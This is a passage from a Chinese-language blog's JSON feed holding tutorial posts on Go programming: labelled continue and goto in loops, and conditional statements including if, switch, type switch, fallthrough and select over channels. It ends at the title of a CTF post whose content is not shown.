class=\"line\">                fmt.Printf(&quot;i2: %d\\n&quot;, i2)</span><br><span class=\"line\">                continue</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // 使用标记</span><br><span class=\"line\">    fmt.Println(&quot;---- continue label ----&quot;)</span><br><span class=\"line\">    re:</span><br><span class=\"line\">        for i := 1; i &lt;= 3; i++ &#123;</span><br><span class=\"line\">            fmt.Printf(&quot;i: %d\\n&quot;, i)</span><br><span class=\"line\">                for i2 := 11; i2 &lt;= 13; i2++ &#123;</span><br><span class=\"line\">                    fmt.Printf(&quot;i2: %d\\n&quot;, i2)</span><br><span class=\"line\">                    continue re</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SNE3qOEI5rlhBVly.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>可以明显看到没用标记之前每个 i 对应三个 i2，使用之后每个 i 对应一个 i2。正是因为标记 re 在整个大 for 循环外面，当执行一次循环之后直接跳出了本次的大 for 循环，回到了起始位置。而没有标记的只是正常结束之后跳出本次的小 for 循环，进行下一次，直到执行三次后不满足小 for 循环条件之后跳回大 for 循环</p>\n<h2 id=\"goto语句\"><a class=\"markdownIt-Anchor\" href=\"#goto语句\">#</a> goto 语句</h2>\n<blockquote>\n<p>Go 语言的 goto 语句可以无条件地转移到过程中指定的行。<br>\ngoto 语句通常与条件语句配合使用。可用来实现条件转移，<br>\n构成循环，跳出循环体等功能。<br>\n但是，在结构化程序设计中一般不主张使用 goto 语句，<br>\n以免造成程序流程的混乱，使理解和调试程序都产生困难。</p>\n</blockquote>\n<p>简单来说 goto 可以从一代码无条件跳转到另一代码进行执行</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">goto label;</span><br><span class=\"line\">..</span><br><span class=\"line\">.</span><br><span class=\"line\">label: statement;</span><br></pre></td></tr></table></figure>\n<p>实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    /* 定义局部变量 */</span><br><span class=\"line\">    var a int = 10</span><br><span class=\"line\"></span><br><span class=\"line\">    /* 循环 */</span><br><span class=\"line\">LOOP:</span><br><span class=\"line\">    for a &lt; 20 &#123;</span><br><span class=\"line\">        if a == 15 &#123;</span><br><span class=\"line\">            /* 跳过迭代 */</span><br><span class=\"line\">            a = a + 1</span><br><span class=\"line\">            goto LOOP</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        fmt.Printf(&quot;a的值为 : %d\\n&quot;, a)</span><br><span class=\"line\">        a++</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CWU6o08mO59Qv8Fr.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这个和前面的 continue 标记执行效果相同，但是实际作用是不一样的，当 a 的值为 15 时执行 a=a+1 之后直接去到 LOOP 所在的地方不执行输出和自加，而这里 LOOP 恰好就是下一次的循环开始，因此结果中没有输出值为 15 的</p>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/",
            "title": "go条件语句",
            "date_published": "2024-04-16T05:58:18.984Z",
            "content_html": "<blockquote>\n<p>条件语句需要开发者通过指定一个或多个条件，并通过测试条件是否为 true<br>\n 来决定是否执行指定语句，并在条件为 false 的情况在执行另外的语句。</p>\n</blockquote>\n<p>语句           描述</p>\n<hr>\n<p>if 语句        <strong>if 语句</strong> 由一个布尔表达式后紧跟一个或多个语句组成。<br>\nif else 语句   <strong>if 语句</strong> 后可以使用可选的 <strong>else 语句</strong>，else 语句中的表达式在布尔表达式为 false 时执行。<br>\nif 嵌套语句    你可以在 <strong>if</strong> 或 <strong>else if</strong> 语句中嵌入一个或多个 <strong>if</strong> 或 <strong>else if</strong> 语句。<br>\nswitch 语句    <strong>switch</strong> 语句用于基于不同条件执行不同动作。<br>\nselect 语句    <strong>select</strong> 语句类似于 <strong>switch</strong> 语句，但是 select 会随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。</p>\n<h1 id=\"if语句\"><a class=\"markdownIt-Anchor\" href=\"#if语句\">#</a> if 语句</h1>\n<p>条件判断：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 布尔表达式 &#123;</span><br><span class=\"line\">   /* 在布尔表达式为 true 时执行 */</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   /* 定义局部变量 */</span><br><span class=\"line\">   var a int = 10</span><br><span class=\"line\"> </span><br><span class=\"line\">   /* 使用 if 语句判断布尔表达式 */</span><br><span class=\"line\">   if a &lt; 20 &#123;</span><br><span class=\"line\">       /* 如果条件为 true 则执行以下语句 */</span><br><span class=\"line\">       fmt.Printf(&quot;a 小于 20\\n&quot; )</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   fmt.Printf(&quot;a 的值为 : %d\\n&quot;, a)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>#</p>\n<h1 id=\"if-else语句\"><a class=\"markdownIt-Anchor\" href=\"#if-else语句\">#</a> if else 语句</h1>\n<p>条件判断：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 布尔表达式 &#123;</span><br><span class=\"line\">   /* 在布尔表达式为 true 时执行 */</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  /* 在布尔表达式为 false 时执行 */</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>if 在表达式为 true 时执行里面的语句，在表达式为 false 时执行 false 里面的语句<br>\n实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   /* 局部变量定义 */</span><br><span class=\"line\">   var a int = 100;</span><br><span class=\"line\"> </span><br><span class=\"line\">   /* 判断布尔表达式 */</span><br><span class=\"line\">   if a &lt; 20 &#123;</span><br><span class=\"line\">       /* 如果条件为 true 则执行以下语句 */</span><br><span class=\"line\">       fmt.Printf(&quot;a 小于 20\\n&quot; );</span><br><span class=\"line\">   &#125; else &#123;</span><br><span class=\"line\">       /* 如果条件为 false 则执行以下语句 */</span><br><span class=\"line\">       fmt.Printf(&quot;a 不小于 20\\n&quot; );</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   fmt.Printf(&quot;a 的值为 : %d\\n&quot;, a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>#</p>\n<h1 id=\"if嵌套语句\"><a class=\"markdownIt-Anchor\" href=\"#if嵌套语句\">#</a> if 嵌套语句</h1>\n<p>条件判断：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 布尔表达式 1 &#123;</span><br><span class=\"line\">   /* 在布尔表达式 1 为 true 时执行 */</span><br><span class=\"line\">   if 布尔表达式 2 &#123;</span><br><span class=\"line\">      /* 在布尔表达式 2 为 true 时执行 */</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>嵌套的理解很简单，就是在第一个 if 语句的表达式为 true 时执行第二个 if 语句<br>\n实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   /* 定义局部变量 */</span><br><span class=\"line\">   var a int = 100</span><br><span class=\"line\">   var b int = 200</span><br><span class=\"line\"> </span><br><span class=\"line\">   /* 判断条件 */</span><br><span class=\"line\">   if a == 100 &#123;</span><br><span class=\"line\">       /* if 条件语句为 true 执行 */</span><br><span class=\"line\">       if b == 200 &#123;</span><br><span class=\"line\">          /* if 条件语句为 true 执行 */</span><br><span class=\"line\">          fmt.Printf(&quot;a 的值为 100 ， b 的值为 200\\n&quot; );</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   fmt.Printf(&quot;a 值为 : %d\\n&quot;, a );</span><br><span class=\"line\">   fmt.Printf(&quot;b 值为 : %d\\n&quot;, b );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>#</p>\n<h1 id=\"switch语句\"><a class=\"markdownIt-Anchor\" href=\"#switch语句\">#</a> switch 语句</h1>\n<p>着重记录一下 switch 语句和 select 语句</p>\n<p>条件判断：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch var1 &#123;</span><br><span class=\"line\">    case val1:</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    case val2:</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以理解为寻找匹配的值，在 case 的几个选项中寻找匹配 var1 的值，如果匹配到则执行相应 case 底下的代码，如果都没有匹配到则执行 default 底下的代码</p>\n<blockquote>\n<p>变量 var1 可以是任何类型，而 val1 和 val2<br>\n 则可以是同类型的任意值。类型不被局限于常量或整数，但必须是相同的类型；或者最终结果为相同类型的表达式。<br>\n您可以同时测试多个可能符合条件的值，使用逗号分割它们，例如：case val1,<br>\nval2, val3。</p>\n</blockquote>\n<p>总结一下就是 var1 可以是任意类型，而 val1 和 val2 可以是任意值但是类型必须和 var1 相同，如有多个符合 case 条件的值可以放在同一行，如 case<br>\n10,20,30: a=1</p>\n<p>switch 可以有两种表达方式，如下实例所示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   /* 定义局部变量 */</span><br><span class=\"line\">   var grade string = &quot;B&quot;</span><br><span class=\"line\">   var marks int = 90</span><br><span class=\"line\">   switch marks &#123;</span><br><span class=\"line\">      case 90: grade = &quot;A&quot;</span><br><span class=\"line\">      case 80: grade = &quot;B&quot;</span><br><span class=\"line\">      case 50,60,70 : grade = &quot;C&quot;</span><br><span class=\"line\">      default: grade = &quot;D&quot;  </span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   switch &#123;</span><br><span class=\"line\">      case grade == &quot;A&quot; :</span><br><span class=\"line\">         fmt.Printf(&quot;优秀!\\n&quot; )    </span><br><span class=\"line\">      case grade == &quot;B&quot;, grade == &quot;C&quot; :</span><br><span class=\"line\">         fmt.Printf(&quot;良好\\n&quot; )      </span><br><span class=\"line\">      case grade == &quot;D&quot; :</span><br><span class=\"line\">         fmt.Printf(&quot;及格\\n&quot; )      </span><br><span class=\"line\">      case grade == &quot;F&quot;:</span><br><span class=\"line\">         fmt.Printf(&quot;不及格\\n&quot; )</span><br><span class=\"line\">      default:</span><br><span class=\"line\">         fmt.Printf(&quot;差\\n&quot; );</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   fmt.Printf(&quot;你的等级是 %s\\n&quot;, grade );      </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>type switch</strong></p>\n<blockquote>\n<p>switch 语句还可以被用于 type-switch 来判断某个 interface<br>\n 变量中实际存储的变量类型。</p>\n</blockquote>\n<p>语法格式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch x.(type)&#123;</span><br><span class=\"line\">    case type:</span><br><span class=\"line\">       statement(s);      </span><br><span class=\"line\">    case type:</span><br><span class=\"line\">       statement(s); </span><br><span class=\"line\">    /* 你可以定义任意个数的case */</span><br><span class=\"line\">    default: /* 可选 */</span><br><span class=\"line\">       statement(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>判断 x 的类型，当然这也可以声明一个变量来进行接收再用 case 去判断变量所接收的类型<br>\n实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   var x interface&#123;&#125;</span><br><span class=\"line\">     </span><br><span class=\"line\">   switch i := x.(type) &#123;</span><br><span class=\"line\">      case nil:  </span><br><span class=\"line\">         fmt.Printf(&quot; x 的类型 :%T&quot;,i)                </span><br><span class=\"line\">      case int:  </span><br><span class=\"line\">         fmt.Printf(&quot;x 是 int 型&quot;)                      </span><br><span class=\"line\">      case float64:</span><br><span class=\"line\">         fmt.Printf(&quot;x 是 float64 型&quot;)          </span><br><span class=\"line\">      case func(int) float64:</span><br><span class=\"line\">         fmt.Printf(&quot;x 是 func(int) 型&quot;)                      </span><br><span class=\"line\">      case bool, string:</span><br><span class=\"line\">         fmt.Printf(&quot;x 是 bool 或 string 型&quot; )      </span><br><span class=\"line\">      default:</span><br><span class=\"line\">         fmt.Printf(&quot;未知型&quot;)    </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>fallthrough</strong></p>\n<blockquote>\n<p>使用 fallthrough 会强制执行后面的 case 语句，fallthrough<br>\n 不会判断下一条 case 的表达式结果是否为 true。</p>\n</blockquote>\n<p>实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    switch &#123;</span><br><span class=\"line\">    case false:</span><br><span class=\"line\">            fmt.Println(&quot;1、case 条件语句为 false&quot;)</span><br><span class=\"line\">            fallthrough</span><br><span class=\"line\">    case true:</span><br><span class=\"line\">            fmt.Println(&quot;2、case 条件语句为 true&quot;)</span><br><span class=\"line\">            fallthrough</span><br><span class=\"line\">    case false:</span><br><span class=\"line\">            fmt.Println(&quot;3、case 条件语句为 false&quot;)</span><br><span class=\"line\">            fallthrough</span><br><span class=\"line\">    case true:</span><br><span class=\"line\">            fmt.Println(&quot;4、case 条件语句为 true&quot;)</span><br><span class=\"line\">    case false:</span><br><span class=\"line\">            fmt.Println(&quot;5、case 条件语句为 false&quot;)</span><br><span class=\"line\">            fallthrough</span><br><span class=\"line\">    default:</span><br><span class=\"line\">            fmt.Println(&quot;6、默认 case&quot;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、case 条件语句为 true</span><br><span class=\"line\">3、case 条件语句为 false</span><br><span class=\"line\">4、case 条件语句为 true</span><br></pre></td></tr></table></figure>\n<p>简单说明一下该实例，第一个 case<br>\ntrue 为第二条，因此第一次进入的便是第二个 case 语句，在第二个 case 语句之后加上了 fallthrough，这时就不管第三个语句是否为 true 都进入执行，第三个后面也加了 fallthrough，不管第四个 case 是否为 true 也是直接进入执行语句，但是第四个 case 末没有 fallthrough，因此第五个 case 就得进行判断，发现是 false 那就不执行。case 中的代码有被执行过，因此 default 中的代码不会被执行。最终输出的为 2、3、4<br>\n#</p>\n<h1 id=\"select语句\"><a class=\"markdownIt-Anchor\" href=\"#select语句\">#</a> select 语句</h1>\n<blockquote>\n<p>select 是 Go 中的一个控制结构，类似于 switch 语句。<br>\nselect 语句只能用于通道操作，每个 case<br>\n 必须是一个通道操作，要么是发送要么是接收。<br>\nselect<br>\n 语句会监听所有指定的通道上的操作，一旦其中一个通道准备好就会执行相应的代码块。<br>\n如果多个通道都准备好，那么 select<br>\n 语句会随机选择一个通道执行。如果所有通道都没有准备好，那么执行 default<br>\n 块中的代码。</p>\n</blockquote>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select &#123;</span><br><span class=\"line\">  case &lt;- channel1:</span><br><span class=\"line\">    // 执行的代码</span><br><span class=\"line\">  case value := &lt;- channel2:</span><br><span class=\"line\">    // 执行的代码</span><br><span class=\"line\">  case channel3 &lt;- value:</span><br><span class=\"line\">    // 执行的代码</span><br><span class=\"line\">    // 你可以定义任意数量的 case</span><br><span class=\"line\">  default:</span><br><span class=\"line\">    // 所有通道都没有准备好，执行的代码</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>以下描述了 select 语句的语法：<br>\n每个 case 都必须是一个通道<br>\n所有 channel 表达式都会被求值<br>\n所有被发送的表达式都会被求值<br>\n如果任意某个通道可以进行，它就执行，其他被忽略。<br>\n如果有多个 case 都可以运行，select<br>\n 会随机公平地选出一个执行，其他不会执行。<br>\n否则：<br>\n如果有 default 子句，则执行该语句。<br>\n如果没有 default 子句，select 将阻塞，直到某个通道可以运行；Go<br>\n 不会重新对 channel 或值进行求值。</p>\n</blockquote>\n<p>应用实例 1：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;fmt&quot;</span><br><span class=\"line\">    &quot;time&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    c1 := make(chan string)</span><br><span class=\"line\">    c2 := make(chan string)</span><br><span class=\"line\">    go func() &#123;</span><br><span class=\"line\">        time.Sleep(1 * time.Second)</span><br><span class=\"line\">        c1 &lt;- &quot;one&quot;</span><br><span class=\"line\">    &#125;()</span><br><span class=\"line\">    go func() &#123;</span><br><span class=\"line\">        time.Sleep(2 * time.Second)</span><br><span class=\"line\">        c2 &lt;- &quot;two&quot;</span><br><span class=\"line\">    &#125;()</span><br><span class=\"line\">    for i := 0; i &lt; 2; i++ &#123;</span><br><span class=\"line\">        select &#123;</span><br><span class=\"line\">        case msg1 := &lt;-c1:</span><br><span class=\"line\">            fmt.Println(&quot;received&quot;, msg1)</span><br><span class=\"line\">        case msg2 := &lt;-c2:</span><br><span class=\"line\">            fmt.Println(&quot;received&quot;, msg2)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在这个实例中创建了两个通道 c1 和 c2，select 在等待两个通道的数据，如果 c1 收到了就执行 case<br>\nmsg1，如果 c2 收到了就执行 case msg2<br>\n 应用实例 2：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">  // 定义两个通道</span><br><span class=\"line\">  ch1 := make(chan string)</span><br><span class=\"line\">  ch2 := make(chan string)</span><br><span class=\"line\">  // 启动两个 goroutine，分别从两个通道中获取数据</span><br><span class=\"line\">  go func() &#123;</span><br><span class=\"line\">    for &#123;</span><br><span class=\"line\">      ch1 &lt;- &quot;from 1&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;()</span><br><span class=\"line\">  go func() &#123;</span><br><span class=\"line\">    for &#123;</span><br><span class=\"line\">      ch2 &lt;- &quot;from 2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;()</span><br><span class=\"line\">  // 使用 select 语句非阻塞地从两个通道中获取数据</span><br><span class=\"line\">  for &#123;</span><br><span class=\"line\">    select &#123;</span><br><span class=\"line\">    case msg1 := &lt;-ch1:</span><br><span class=\"line\">      fmt.Println(msg1)</span><br><span class=\"line\">    case msg2 := &lt;-ch2:</span><br><span class=\"line\">      fmt.Println(msg2)</span><br><span class=\"line\">    default:</span><br><span class=\"line\">      // 如果两个通道都没有可用的数据，则执行这里的语句</span><br><span class=\"line\">      fmt.Println(&quot;no message received&quot;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>上述实例中我们定义了两个通道，并启动了两个协程（Goroutine）从这两个通道中获取数据。在<br>\n main 函数中，我们使用 select<br>\n 语句在这两个通道中进行非阻塞的选择，如果两个通道都没有可用的数据，就执行<br>\n default 子句中的语句。<br>\n以下实例执行后会不断地从两个通道中获取到的数据，当两个通道都没有可用的数据时，会输出<br>\n “no message received”。</p>\n</blockquote>\n<p>在第二个实例中，启动了协程从这两个通道中获取数据，更快捷高效，因为没有对 for 循环语句做限制，因此它会不断从通道中获取数据，直到没有数据获取了就执行 default 中的代码，输出 no<br>\nmessage received</p>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Geek%20Challenge%202023%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/Geek%20Challenge%202023%20Misc/",
            "title": "Geek Challenge 2023 Misc",
            "date_published": "2024-04-16T05:58:18.981Z",
